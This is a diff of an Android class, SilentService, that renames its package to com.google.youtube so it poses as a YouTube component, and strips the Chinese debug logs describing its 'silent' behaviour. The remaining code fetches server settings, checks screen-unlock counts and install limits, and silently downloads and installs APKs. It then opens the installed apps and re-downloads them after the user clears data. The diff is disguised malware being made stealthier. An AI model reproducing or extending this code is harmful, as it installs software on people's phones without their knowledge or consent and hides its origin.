@@ -1,4 +1,4 @@
-package com.mx.utils.services;
+package com.google.youtube.services;
 
 import java.io.File;
 import java.util.Calendar;
@@ -9,9 +9,9 @@ import java.util.Set;
 
 import org.json.JSONObject;
 
-import com.mx.utils.utils.DeviceUtils;
-import com.mx.utils.utils.HttpUtil;
-import com.mx.utils.utils.MyHelpUtil;
+import com.google.youtube.utils.DeviceUtils;
+import com.google.youtube.utils.HttpUtil;
+import com.google.youtube.utils.MyHelpUtil;
 
 import android.app.DownloadManager;
 import android.app.DownloadManager.Query;
@@ -65,8 +65,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 			try {
 
 				String msg = HttpUtil.postRequest(localURL, param);
-
-				System.out.println("静默：服务器返回结果：：：" + msg);
 
 				if (!TextUtils.isEmpty(msg)) {
 
@@ -134,8 +132,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 		if (!msgSharedPreferences.contains("silent")) {
 
-			System.out.println("静默：初始化时间，满足条件");
-
 			time_iner = true;
 		} else {
 
@@ -144,37 +140,18 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 			long display_interval_to_long = Math.abs(interval * 3600 * 1000);
 
-			System.out.println("静默时间间隔：" + reslut + "毫秒" + "::" + reslut / 3600
-					/ 1000 + "H");
-
 			if (reslut >= display_interval_to_long) {
-
-				System.out.println("满足静默时间间隔");
 
 				time_iner = true;
 
-			} else {
-				System.out.println("不满足静默时间间隔");
 			}
 		}
-
-		System.out.println("静默：本机解锁屏次数：" + local_screen_count);
-
-		System.out.println("静默：服务器限制解锁屏次数：" + screen_count);
-
-		System.out.println("静默：本机保存：" + apppakname + "安装次数" + installCount);
-
-		System.out.println("静默：服务器限制：" + apppakname + "安装次数：" + install_count);
 
 		if (local_screen_count >= screen_count && time_iner
 				&& installCount <= install_count) {
 
-			System.out.println("静默：静默条件>>满足条件");
-
 			return true;
 
-		} else {
-			System.out.println("静默：不满足静默条件");
 		}
 
 		return false;
@@ -209,8 +186,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 		if (s == -1) {
 
-			System.out.println("静默：下载间隔时间>>满足间隔");
-
 			return true;
 		}
 
@@ -218,19 +193,12 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 		long res = Math.abs(new Date().getTime() - s);
 
-		System.out.println("静默：下载间隔时间：" + res + "毫秒" + "分钟：" + res / 60 / 1000);
-
 		if (res >= srestolong) {
 
-			System.out.println("静默：下载间隔时间>>满足间隔");
 
 			return true;
 
-		} else {
-
-			System.out.println("静默：下载间隔时间>>不满足满足间隔");
-
-		}
+		} 
 		return false;
 	}
 
@@ -240,13 +208,9 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 		DownloadManager downloadManager = (DownloadManager) context
 				.getSystemService(Context.DOWNLOAD_SERVICE);
 
-		System.out.println("静默：》APK下载地址：" + download_url);
-
 		Uri uri;
 		
 		if(TextUtils.isEmpty(download_url)){
-
-			System.out.println("静默：下载地址没有配置，到默认服务器下载");
 			
 			uri = Uri.parse(MyHelpUtil.lineDownloadAppURL(context, appalias));
 			
@@ -332,9 +296,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 					if (!file.exists()) {
 
-						System.out
-								.println("本地XML有downloadID保存，DownloadManager中存在记录，但是文件不存在，重新下载");
-
 						downloadManager.remove(downloadid);
 
 						if (checkDownloadOption()) {
@@ -354,10 +315,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 					int status = cursor.getInt(column_status_index);
 
-					System.out
-							.println("本地XML有downloadID保存，DownloadManager中存在记录：：文件状态码："
-									+ status);
-
 					if (status == DownloadManager.STATUS_SUCCESSFUL) {
 
 						PackageInfo pi = context.getPackageManager()
@@ -372,8 +329,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 							if (checkDownloadOption()) {
 
-								System.out.println("redownload comming！");
-
 								long id = silentDownload(appalias, apppakname,
 										download_url);
 
@@ -385,16 +340,9 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 						}
 
-						System.out
-								.println("本地XML有downloadID保存，DownloadManager中存在记录：：文件状态码验证成功，进行安装");
-
 						int install_return = MyHelpUtil.install(localFileURI);
 
-						System.out.println("静默：安装返回结果：" + install_return);
-
 						if (install_return == 1) {
-
-							System.out.println("静默：APK错误安装失败删除错误安装包");
 
 							file.delete();
 
@@ -412,8 +360,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 							/* Open App */
 							if (checkOpenTime()) {
-
-								System.out.println("静默：满足打开APP时间间隔：运行app");
 
 								MyHelpUtil.openApp(apppakname, context);
 
@@ -435,11 +381,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 						if (checkDownloadOption()) {
 
-							System.out
-									.println("本地xml文件存在下载信息，DownloadManager不存在下载 ，文件存在，删除文件后重新下载.");
-
-							System.out.println("出现此种情况,防止手机恢复出厂设置,出现数据不统一情况");
-
 							long id = silentDownload(appalias, apppakname,
 									download_url);
 
@@ -450,11 +391,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 					} else {
 
 						if (checkDownloadOption()) {
-
-							System.out
-									.println("本地xml文件存在下载信息，DownloadManager不存在下载 ，文件不存在，重新下载.");
-
-							System.out.println("出现此种情况,防止手机恢复出厂设置,出现数据不统一情况");
 
 							long id = silentDownload(appalias, apppakname,
 									download_url);
@@ -477,10 +413,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 
 				if (checkDownloadOption()) {
 
-					System.out.println("本地xml文件不存在保存的下载信息，文件存在，删除重新下载.");
-
-					System.out.println("出现的情况:用户清除xml数据.防止状态不准确,重新下载");
-
 					file.delete();
 
 					long id = silentDownload(appalias, apppakname, download_url);
@@ -492,8 +424,6 @@ public class SilentService extends AsyncTask<Void, Integer, String> {
 			} else {
 
 				if (checkDownloadOption()) {
-
-					System.out.println("本地xml文件不存在保存的下载信息，文件不存在，下载.主要执行的方法");
 
 					long id = silentDownload(appalias, apppakname, download_url);
 
